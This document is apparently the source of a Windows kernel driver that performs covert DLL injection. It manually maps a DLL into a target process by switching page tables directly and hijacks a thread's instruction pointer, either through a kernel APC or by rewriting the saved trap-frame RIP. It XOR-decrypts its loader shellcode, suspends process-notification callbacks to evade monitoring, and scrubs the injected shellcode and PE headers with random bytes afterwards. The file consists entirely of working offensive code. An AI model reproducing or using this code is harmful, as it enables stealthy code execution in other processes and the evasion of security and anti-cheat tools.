typedef VOID(*PKNORMAL_ROUTINE)(IN PVOID NormalContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2);
typedef VOID(*PKKERNEL_ROUTINE)(IN struct _KAPC* Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2);
typedef VOID(*PKRUNDOWN_ROUTINE)(IN struct _KAPC* Apc);

#define INITIALSTACKOFFSET          0x28
#define OriginalApcEnvironment      0
#define SHELLCODE_RIP_BACKUP_OFFSET 0x28 
#define JUMP_PARAM_PTR_OFFSET       0x04 
#define JUMP_LOADER_PTR_OFFSET      0x0E 
#define INJECT_OK_MAGIC             0x99999

typedef struct _CR3_SWITCH_CTX {
    ULONG64 OldCr3;
    KIRQL   OldIrql;
    BOOLEAN InterruptEnabled;
} CR3_SWITCH_CTX, * PCR3_SWITCH_CTX;

typedef struct _PARAMX64Ex_ {
    ULONG64 LdrGetProcedureAddress;
    ULONG64 pLdrLoadDll;
    ULONG64 RtlInitAnsiString;
    ULONG64 RtlAnsiStringToUnicodeString;
    ULONG64 RtlFreeUnicodeString;
    PIMAGE_NT_HEADERS pNTHeader;
    PVOID pMemoryAddress;
    ULONG64 InjectOk;
} PARAMX64Ex, * PPARAMX64Ex;

typedef struct _NTDLL_APIS {
    ULONG64 LdrGetProcedureAddress;
    ULONG64 LdrLoadDll;
    ULONG64 RtlInitAnsiString;
    ULONG64 RtlAnsiStringToUnicodeString;
    ULONG64 RtlFreeUnicodeString;
} NTDLL_APIS, * PNTDLL_APIS;

typedef struct _INJECT_SHELLCODE {
    ULONG64 LoaderPtr;
    ULONG64 LoaderSize;
    ULONG64 JumpPtr;
    ULONG64 JumpSize;
} INJECT_SHELLCODE, * PINJECT_SHELLCODE;

typedef struct _Clear_Data {
    WORK_QUEUE_ITEM workitem;
    PMap Map;
    ULONG64 m_start_shellcode_address;
    ULONG64 m_start_shellcode_size;
    ULONG64 m_param_buffer_address;
    ULONG64 m_param_buffer_size;
    ULONG64 m_loader_shellcode_address;
    ULONG64 m_loader_shellcode_size;
    ULONG64 m_Pe_address;
    ULONG64 m_Pe_Size;
    ULONG64 m_Pe_HeadSize;
} Clear_Data, * PClear_Data;

__forceinline ULONG64 SwitchToProcessCr3(PMap Map) {
    ULONG64 oldcr3 = __readcr3();
    __writecr3(Map->Process.CurrentCr3 & ~0xFFFULL);
    return oldcr3;
}

__forceinline VOID MyKeEnterCriticalRegion(PMap Map) {
    _InterlockedDecrement16((SHORT*)(__readgsqword(0x188) + Map->System.KernelApcDisableOffset));
}

__forceinline VOID MyKeLeaveCriticalRegion(PMap Map) {
    _InterlockedIncrement16((SHORT*)(__readgsqword(0x188) + Map->System.KernelApcDisableOffset));
}

__forceinline VOID SwitchToTargetProcess(PMap Map, PCR3_SWITCH_CTX Ctx) {
    MyKeEnterCriticalRegion(Map);
    Ctx->OldIrql = RaiseIrql(DISPATCH_LEVEL);
    Ctx->InterruptEnabled = (__readeflags() & 0x200) != 0;
    if (Ctx->InterruptEnabled) _disable();
    Ctx->OldCr3 = SwitchToProcessCr3(Map);
}

__forceinline VOID RestoreProcessContext(PMap Map, PCR3_SWITCH_CTX Ctx) {
    __writecr3(Ctx->OldCr3);
    if (Ctx->InterruptEnabled) _enable();
    LowerIrql(Ctx->OldIrql);
    MyKeLeaveCriticalRegion(Map);
}

__forceinline NTSTATUS KeRandomSleepRange(PMap Map, ULONG MinMilliseconds, ULONG MaxMilliseconds) {
    if (MinMilliseconds >= MaxMilliseconds) return STATUS_INVALID_PARAMETER;
    ULONG64 seed = __rdtsc();
    ULONG ms = MinMilliseconds + (MyRandomEx(&seed) % (MaxMilliseconds - MinMilliseconds + 1));
    return KeSleep(Map, ms);
}

__forceinline BOOLEAN IsTargetProcessAlive(PMap Map) {
    if (!Map->Process.CurrentProcess) return FALSE;
    return *(NTSTATUS*)((PUCHAR)Map->Process.CurrentProcess + Map->System.ExitStatusOffset) == STATUS_PENDING;
}

__forceinline PETHREAD GetWindowsThread(PMap Map, PEPROCESS pEprocess) {
    PLIST_ENTRY plisthead = (PLIST_ENTRY)((PUCHAR)pEprocess + 0x30);

    for (PLIST_ENTRY plistflink = plisthead->Flink; plistflink != plisthead; plistflink = plistflink->Flink) {
        PETHREAD current_thread = (PETHREAD)((PUCHAR)plistflink - 0x2f8);
        if (!MyMmIsAddressValid(Map, current_thread)) continue;
        if (((HANDLE(*)(PETHREAD))_IT(Map, Map->ImportTable.PsGetThreadWin32Thread))(current_thread)) return current_thread;
    }
    return NULL;
}

__declspec(noinline) VOID InjectApc(struct _KAPC* apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
    PMap Map = (PMap)*SystemArgument1;

    UCHAR origNotify = 0;
    DisablePspNotify(Map, &origNotify);

    PETHREAD currentThread = KeGetCurrentThread();
    PVOID stackAddr = (PVOID) * (ULONG64*)((ULONG64)currentThread + INITIALSTACKOFFSET);

    if (MyMmIsAddressValid(Map, stackAddr)) {
        PKTRAP_FRAME pCurrentTrap = (PKTRAP_FRAME)((ULONG64)stackAddr - sizeof(KTRAP_FRAME));
        ULONG64 shellcodeRipBackup = (ULONG64)Map->Inject.TargetAddress + SHELLCODE_RIP_BACKUP_OFFSET;
        MyWrite(Map, shellcodeRipBackup, (ULONG64)&pCurrentTrap->Rip, sizeof(ULONG64));
        pCurrentTrap->Rip = (ULONG64)Map->Inject.TargetAddress;
    }

    if (apc) ((decltype(ExFreePoolWithTag)*)_IT(Map, Map->ImportTable.ExFreePoolWithTag))(apc, Map->MEMORY_TAG.llhS);

    EnablePspNotify(Map, origNotify);
}

__declspec(noinline) NTSTATUS ApcExecuteFunc(PMap Map, ULONG64 funcAddr) {
    PETHREAD ethread = GetWindowsThread(Map, (PEPROCESS)Map->Process.CurrentProcess);
    if (!ethread) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_NO_MORE_ENTRIES;
        return STATUS_UNSUCCESSFUL;
    }

    UCHAR origNotify = 0;
    DisablePspNotify(Map, &origNotify);

    PRKAPC kApc = (PRKAPC)((decltype(ExAllocatePoolWithTag)*)_IT(Map, Map->ImportTable.ExAllocatePoolWithTag))(NonPagedPool, sizeof(KAPC), Map->MEMORY_TAG.llhS);
    if (!kApc) {
        EnablePspNotify(Map, origNotify);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    Map->Inject.TargetAddress = funcAddr;

    ((VOID(*)(PRKAPC, PRKTHREAD, ULONG, PKKERNEL_ROUTINE, PKRUNDOWN_ROUTINE, PKNORMAL_ROUTINE, KPROCESSOR_MODE, PVOID))
        _IT(Map, Map->ImportTable.KeInitializeApc))(kApc, ethread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)InjectApc, NULL, NULL, KernelMode, NULL);

    BOOLEAN ret = ((BOOLEAN(*)(PRKAPC, PVOID, PVOID, KPRIORITY))
        _IT(Map, Map->ImportTable.KeInsertQueueApc))(kApc, (PVOID)Map, NULL, IO_NO_INCREMENT);

    if (!ret) {
        ((decltype(ExFreePoolWithTag)*)_IT(Map, Map->ImportTable.ExFreePoolWithTag))(kApc, Map->MEMORY_TAG.llhS);
        EnablePspNotify(Map, origNotify);
        return STATUS_UNSUCCESSFUL;
    }

    EnablePspNotify(Map, origNotify);
    return STATUS_SUCCESS;
}

__declspec(noinline) NTSTATUS SetThreadStartAddressMemLoad(PMap Map) {
    PVOID threadObj = GetWindowsThread(Map, (PEPROCESS)Map->Process.CurrentProcess);
    if (!threadObj) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_NO_MORE_ENTRIES;
        return STATUS_UNSUCCESSFUL;
    }

    ULONG64 threadInitialStackOffset = (ULONG64)threadObj + INITIALSTACKOFFSET;
    ULONG64 initialStackAddr = 0;
    if (!NT_SUCCESS(MyRead(Map, threadInitialStackOffset, &initialStackAddr, sizeof(ULONG64)))) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_ACCESS_VIOLATION;
        return STATUS_UNSUCCESSFUL;
    }

    ULONG64 trapFrameAddr = initialStackAddr - sizeof(KTRAP_FRAME);
    ULONG64 originalRip = 0;
    if (!NT_SUCCESS(MyRead(Map, trapFrameAddr + FIELD_OFFSET(KTRAP_FRAME, Rip), &originalRip, sizeof(ULONG64)))) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_ACCESS_VIOLATION;
        return STATUS_UNSUCCESSFUL;
    }

    ULONG64 shellcodeRipBackup = (ULONG64)Map->Inject.TargetAddress + SHELLCODE_RIP_BACKUP_OFFSET;
    if (!NT_SUCCESS(MyWrite(Map, shellcodeRipBackup, (ULONG64)&originalRip, sizeof(ULONG64)))) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_ACCESS_VIOLATION;
        return STATUS_UNSUCCESSFUL;
    }

    ULONG64 newRip = Map->Inject.TargetAddress;
    if (!NT_SUCCESS(MyWrite(Map, trapFrameAddr + FIELD_OFFSET(KTRAP_FRAME, Rip), (ULONG64)&newRip, sizeof(ULONG64)))) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_ACCESS_VIOLATION;
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCESS;
}

__declspec(noinline) PVOID GetNativeMemLoadCodePEtool(PMap Map, PVOID DllData, SIZE_T DllSize, PNTDLL_APIS apis, PVOID LoaderBytes, SIZE_T LoaderBytesSize, PVOID JumpBytes, SIZE_T JumpBytesSize) {
    if (!apis || !apis->LdrGetProcedureAddress || !apis->LdrLoadDll || !apis->RtlInitAnsiString || !apis->RtlAnsiStringToUnicodeString || !apis->RtlFreeUnicodeString) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_PROCEDURE_NOT_FOUND;
        return NULL;
    }
    if (!LoaderBytes || !LoaderBytesSize || !JumpBytes || !JumpBytesSize || JumpBytesSize > 0x100) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INVALID_PARAMETER;
        return NULL;
    }
    if (!DllData || DllSize < sizeof(IMAGE_DOS_HEADER)) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INVALID_PARAMETER;
        return NULL;
    }

    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS pNTHeader = NULL;
    if (!GetImageDosHead(Map, DllData, DllSize, &pDosHeader) || !GetImageNtHead(Map, DllData, DllSize, pDosHeader, &pNTHeader)) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INVALID_IMAGE_FORMAT;
        return NULL;
    }
    PIMAGE_SECTION_HEADER pSectionHeader = GetSectionHeader(pNTHeader);

    SIZE_T PEHeadSize = pNTHeader->OptionalHeader.SizeOfHeaders;
    SIZE_T uSize = GetPeSize(pNTHeader, pSectionHeader, pNTHeader->OptionalHeader.SectionAlignment);
    if (uSize == 0) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INVALID_IMAGE_FORMAT;
        return NULL;
    }

    CR3_SWITCH_CTX switchCtx = { 0 };
    DriverControl allocCtl = { 0 };

    ULONG64 pMemoryAddress = 0;
    ULONG64 paramAddr = 0;
    ULONG64 loaderAddr = 0;
    ULONG64 jumpAddr = 0;
    PClear_Data item = NULL;

    auto FreeRemote = [&](ULONG64 addr) {
        if (!addr) return;
        DriverControl c = { 0 };
        c.Address = addr;
        FreeMemory(Map, &c);
    };
    auto Cleanup = [&]() {
        FreeRemote(jumpAddr);
        FreeRemote(loaderAddr);
        FreeRemote(paramAddr);
        FreeRemote(pMemoryAddress);
        if (item) ((decltype(ExFreePoolWithTag)*)_IT(Map, Map->ImportTable.ExFreePoolWithTag))(item, Map->MEMORY_TAG.yKeV);
    };

    allocCtl.Size = uSize;
    pMemoryAddress = AllocMemory(Map, &allocCtl);
    if (!pMemoryAddress) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INSUFFICIENT_RESOURCES;
        Cleanup();
        return NULL;
    }

    SwitchToTargetProcess(Map, &switchCtx);
    if (!CopySection(Map, DllData, DllSize, pNTHeader, pSectionHeader, (PVOID)pMemoryAddress)) {
        RestoreProcessContext(Map, &switchCtx);
        Map->Inject.Inject_Data.InjectionResult = STATUS_INVALID_IMAGE_FORMAT;
        Cleanup();
        return NULL;
    }
    FixLocData(pNTHeader, (PVOID)pMemoryAddress);
    RestoreProcessContext(Map, &switchCtx);

    allocCtl.Size = sizeof(PARAMX64Ex);
    paramAddr = AllocMemory(Map, &allocCtl);
    if (!paramAddr) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INSUFFICIENT_RESOURCES;
        Cleanup();
        return NULL;
    }
    PPARAMX64Ex param = (PPARAMX64Ex)paramAddr;

    SwitchToTargetProcess(Map, &switchCtx);
    param->LdrGetProcedureAddress = apis->LdrGetProcedureAddress;
    param->pLdrLoadDll = apis->LdrLoadDll;
    param->RtlInitAnsiString = apis->RtlInitAnsiString;
    param->RtlAnsiStringToUnicodeString = apis->RtlAnsiStringToUnicodeString;
    param->RtlFreeUnicodeString = apis->RtlFreeUnicodeString;
    param->pNTHeader = (PIMAGE_NT_HEADERS)(pMemoryAddress + pDosHeader->e_lfanew);
    param->pMemoryAddress = (PVOID)pMemoryAddress;
    RestoreProcessContext(Map, &switchCtx);

    allocCtl.Size = LoaderBytesSize;
    loaderAddr = AllocMemory(Map, &allocCtl);
    if (!loaderAddr) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INSUFFICIENT_RESOURCES;
        Cleanup();
        return NULL;
    }
    if (!NT_SUCCESS(MyWrite(Map, loaderAddr, (ULONG64)LoaderBytes, LoaderBytesSize))) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_ACCESS_VIOLATION;
        Cleanup();
        return NULL;
    }

    allocCtl.Size = PAGE_SIZE;
    jumpAddr = AllocMemory(Map, &allocCtl);
    if (!jumpAddr) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INSUFFICIENT_RESOURCES;
        Cleanup();
        return NULL;
    }

    UCHAR tempShellcode[0x100];
    __movsb(tempShellcode, (PUCHAR)JumpBytes, JumpBytesSize);
    *(ULONG64*)(tempShellcode + JUMP_PARAM_PTR_OFFSET) = paramAddr;
    *(ULONG64*)(tempShellcode + JUMP_LOADER_PTR_OFFSET) = loaderAddr;

    if (!NT_SUCCESS(MyWrite(Map, jumpAddr, (ULONG64)tempShellcode, JumpBytesSize))) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_ACCESS_VIOLATION;
        Cleanup();
        return NULL;
    }

    item = (PClear_Data)((decltype(ExAllocatePoolWithTag)*)_IT(Map, Map->ImportTable.ExAllocatePoolWithTag))(NonPagedPool, sizeof(Clear_Data), Map->MEMORY_TAG.yKeV);
    if (!item) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_INSUFFICIENT_RESOURCES;
        Cleanup();
        return NULL;
    }

    item->Map = Map;
    item->m_loader_shellcode_address = loaderAddr;
    item->m_loader_shellcode_size = LoaderBytesSize;
    item->m_start_shellcode_address = (ULONG64)jumpAddr;
    item->m_start_shellcode_size = PAGE_SIZE;
    item->m_param_buffer_address = (ULONG64)param;
    item->m_param_buffer_size = sizeof(PARAMX64Ex);
    item->m_Pe_address = (ULONG64)pMemoryAddress;
    item->m_Pe_Size = uSize;
    item->m_Pe_HeadSize = PEHeadSize;
    return (PVOID)item;
}

__forceinline VOID DestroyInjectBuffer(PMap Map, PClear_Data item, BOOLEAN freePe = TRUE) {
    if (!item) return;
    auto FreeRemote = [&](ULONG64 addr) {
        if (!addr) return;
        DriverControl c = { 0 };
        c.Address = addr;
        FreeMemory(Map, &c);
        };
    FreeRemote(item->m_start_shellcode_address);
    FreeRemote(item->m_loader_shellcode_address);
    FreeRemote(item->m_param_buffer_address);
    if (freePe) FreeRemote(item->m_Pe_address);
    ((decltype(ExFreePoolWithTag)*)_IT(Map, Map->ImportTable.ExFreePoolWithTag))(item, Map->MEMORY_TAG.yKeV);
}

__forceinline NTSTATUS RipInjectDLL(PMap Map, PVOID DllData, SIZE_T DllSize, PVOID* allcateAddress, PNTDLL_APIS apis, PVOID LoaderBytes, SIZE_T LoaderBytesSize, PVOID JumpBytes, SIZE_T JumpBytesSize) {
    PClear_Data InjectBuffer = (PClear_Data)GetNativeMemLoadCodePEtool(Map, DllData, DllSize, apis, LoaderBytes, LoaderBytesSize, JumpBytes, JumpBytesSize);
    if (!InjectBuffer) return STATUS_UNSUCCESSFUL;

    Map->Inject.TargetAddress = InjectBuffer->m_start_shellcode_address;
    NTSTATUS status = SetThreadStartAddressMemLoad(Map);
    if (!NT_SUCCESS(status)) {
        DestroyInjectBuffer(Map, InjectBuffer);
        *allcateAddress = NULL;
        return status;
    }
    *allcateAddress = InjectBuffer;
    return status;
}

__forceinline NTSTATUS ApcInjectDLL(PMap Map, PVOID DllData, SIZE_T DllSize, PVOID* allcateAddress, PNTDLL_APIS apis, PVOID LoaderBytes, SIZE_T LoaderBytesSize, PVOID JumpBytes, SIZE_T JumpBytesSize) {
    PClear_Data InjectBuffer = (PClear_Data)GetNativeMemLoadCodePEtool(Map, DllData, DllSize, apis, LoaderBytes, LoaderBytesSize, JumpBytes, JumpBytesSize);
    if (!InjectBuffer) return STATUS_INSUFFICIENT_RESOURCES;

    NTSTATUS status = ApcExecuteFunc(Map, InjectBuffer->m_start_shellcode_address);
    if (!NT_SUCCESS(status)) {
        Map->Inject.Inject_Data.InjectionResult = STATUS_UNSUCCESSFUL;
        DestroyInjectBuffer(Map, InjectBuffer);
        *allcateAddress = NULL;
        return status;
    }
    *allcateAddress = (PVOID)InjectBuffer;
    return status;
}

__declspec(noinline) VOID CleanupMemoryInRandomOrder(PVOID itemr) {
    PClear_Data item = (PClear_Data)itemr;
    PMap Map = item->Map;

    auto BailIfDead = [&]() -> bool {
        if (!IsTargetProcessAlive(Map)) {
            Map->Inject.Inject_Data.InjectionResult = STATUS_PROCESS_IS_TERMINATING;
            DestroyInjectBuffer(Map, item);
            return true;
        }
        return false;
    };

    KeRandomSleepRange(Map, 10, 100);
    if (BailIfDead()) return;

    PARAMX64Ex Mem = { 0 };
    while (Mem.InjectOk == 0) {
        if (BailIfDead()){
            Map->Inject.Inject_Data.InjectionResult = STATUS_PROCESS_IS_TERMINATING;
            return;
        }
        MyRead(Map, item->m_param_buffer_address, &Mem, sizeof(Mem));
        if (Mem.InjectOk == INJECT_OK_MAGIC) break;
        KeRandomSleepRange(Map, 10, 100);
    }

    KeRandomSleepRange(Map, 200, 400);

    struct { ULONG64 addr; ULONG64 size; } regions[] = {
        { item->m_param_buffer_address, item->m_param_buffer_size },
        { item->m_loader_shellcode_address, item->m_loader_shellcode_size },
        { item->m_start_shellcode_address, item->m_start_shellcode_size },
        { item->m_Pe_address, item->m_Pe_HeadSize },
    };

    for (auto& r : regions) {
        KeRandomSleepRange(Map, 10, 100);
        FillRandom(Map, r.addr, r.size);
    }

    if (BailIfDead()) return;

    KeRandomSleepRange(Map, 200, 400);

    Map->Inject.Inject_Data.InjectionResult = STATUS_SUCCESS;
    DestroyInjectBuffer(Map, item, FALSE);
}

__declspec(noinline) NTSTATUS InjectDLL(PMap Map, PDriverControl pControl) {
    if (!IsTargetProcessAlive(Map)) return STATUS_INSUFFICIENT_RESOURCES;
    if (!pControl || !pControl->Buffer || !pControl->Size || !pControl->ProcessId || !pControl->Address) return STATUS_INVALID_PARAMETER;

    ULONG64 apisUserPtr = pControl->ProcessId;
    ULONG64 shellUserPtr = pControl->Address;
    ULONG64 DllData = pControl->Buffer;
    SIZE_T  DllSize = (SIZE_T)pControl->Size;
    ULONG64 injectMethod = pControl->Type;

    PNTDLL_APIS apisLocal = NULL;
    PINJECT_SHELLCODE shellInfo = NULL;
    PUCHAR loaderLocal = NULL;
    PUCHAR jumpLocal = NULL;
    UCHAR* DATA = NULL;
    PVOID injectBuffer = NULL;
    NTSTATUS status = STATUS_INVALID_PARAMETER;
    NTSTATUS retStatus = STATUS_UNSUCCESSFUL;
    NTSTATUS tStatus = STATUS_UNSUCCESSFUL;

    auto Alloc = [&](SIZE_T size, ULONG tag) -> PVOID {
        return ((decltype(ExAllocatePoolWithTag)*)_IT(Map, Map->ImportTable.ExAllocatePoolWithTag))(NonPagedPool, size, tag);
    };
    auto Free = [&](PVOID p, ULONG tag) {
        if (p) ((decltype(ExFreePoolWithTag)*)_IT(Map, Map->ImportTable.ExFreePoolWithTag))(p, tag);
    };
    auto FreeAll = [&]() {
        Free(DATA, Map->MEMORY_TAG.News);
        Free(jumpLocal, Map->MEMORY_TAG.AlcI);
        Free(loaderLocal, Map->MEMORY_TAG.AlcI);
        Free(shellInfo, Map->MEMORY_TAG.AlcI);
        Free(apisLocal, Map->MEMORY_TAG.AlcI);
    };

    apisLocal = (PNTDLL_APIS)Alloc(sizeof(NTDLL_APIS), Map->MEMORY_TAG.AlcI);
    if (!apisLocal) return STATUS_INSUFFICIENT_RESOURCES;
    __movsb((PUCHAR)apisLocal, (PUCHAR)apisUserPtr, sizeof(NTDLL_APIS));

    shellInfo = (PINJECT_SHELLCODE)Alloc(sizeof(INJECT_SHELLCODE), Map->MEMORY_TAG.AlcI);
    if (!shellInfo) { FreeAll(); return STATUS_INSUFFICIENT_RESOURCES; }
    __movsb((PUCHAR)shellInfo, (PUCHAR)shellUserPtr, sizeof(INJECT_SHELLCODE));

    if (!shellInfo->LoaderPtr || !shellInfo->LoaderSize || !shellInfo->JumpPtr || !shellInfo->JumpSize || shellInfo->LoaderSize <= 8 || shellInfo->JumpSize <= 8) {
        FreeAll();
        return STATUS_INVALID_PARAMETER;
    }

    loaderLocal = (PUCHAR)Alloc((SIZE_T)shellInfo->LoaderSize, Map->MEMORY_TAG.AlcI);
    if (!loaderLocal) { 
        FreeAll(); 
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    jumpLocal = (PUCHAR)Alloc((SIZE_T)shellInfo->JumpSize, Map->MEMORY_TAG.AlcI);
    if (!jumpLocal) { 
        FreeAll(); 
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    __movsb(loaderLocal, (PUCHAR)shellInfo->LoaderPtr, (SIZE_T)shellInfo->LoaderSize);
    __movsb(jumpLocal,   (PUCHAR)shellInfo->JumpPtr,   (SIZE_T)shellInfo->JumpSize);

    XorDecrypt(loaderLocal + 8, (SIZE_T)shellInfo->LoaderSize - 8, (CONST CHAR*)loaderLocal, 8);
    XorDecrypt(jumpLocal + 8, (SIZE_T)shellInfo->JumpSize - 8, (CONST CHAR*)jumpLocal, 8);

    DATA = (UCHAR*)Alloc(DllSize, Map->MEMORY_TAG.News);
    if (!DATA) { 
        FreeAll(); 
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    __movsb(DATA, (PUCHAR)DllData, DllSize);

    switch (injectMethod) {
    case UN_S_ApcInjectDLL:
        status = ApcInjectDLL(Map, DATA, DllSize, &injectBuffer, apisLocal, loaderLocal + 8, (SIZE_T)shellInfo->LoaderSize - 8, jumpLocal + 8, (SIZE_T)shellInfo->JumpSize - 8);
        break;
    case UN_S_RipInjectDLL:
        status = RipInjectDLL(Map, DATA, DllSize, &injectBuffer, apisLocal, loaderLocal + 8, (SIZE_T)shellInfo->LoaderSize - 8, jumpLocal + 8, (SIZE_T)shellInfo->JumpSize - 8);
        break;
    default:
        status = STATUS_INVALID_PARAMETER;
        break;
    }
    if (!NT_SUCCESS(status) || !IsTargetProcessAlive(Map)) {
        if (injectBuffer) DestroyInjectBuffer(Map, (PClear_Data)injectBuffer);
        FreeAll();
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    if (injectBuffer) {
        PClear_Data item = (PClear_Data)injectBuffer;
        Map->Inject.Inject_Data.m_Pe_address = item->m_Pe_address;
        Map->Inject.Inject_Data.m_Pe_Size = item->m_Pe_Size;
        Map->Inject.Inject_Data.m_loader_shellcode_address = item->m_loader_shellcode_address;
        Map->Inject.Inject_Data.m_loader_shellcode_size = item->m_loader_shellcode_size;

        UCHAR origNotify = 0;
        DisablePspNotify(Map, &origNotify);
        HANDLE   threadHandle = NULL;
        tStatus = ((decltype(PsCreateSystemThread)*)_IT(Map, Map->ImportTable.PsCreateSystemThread))(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, CleanupMemoryInRandomOrder, (PVOID)item);
        if (NT_SUCCESS(tStatus)) {
            ((decltype(ZwClose)*)_IT(Map, Map->ImportTable.ZwClose))(threadHandle);
        }
        else {
            DestroyInjectBuffer(Map, item);
            Map->Inject.Inject_Data.InjectionResult = tStatus;
            injectBuffer = NULL;
        }
        EnablePspNotify(Map, origNotify);
    }
    retStatus = injectBuffer ? STATUS_SUCCESS : (NT_SUCCESS(status) ? tStatus : status);

    FreeAll();
    return retStatus;
}